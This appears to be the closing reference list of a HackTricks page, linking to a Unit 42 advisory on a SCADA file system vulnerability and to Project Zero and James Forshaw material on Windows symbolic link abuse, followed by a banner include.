- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
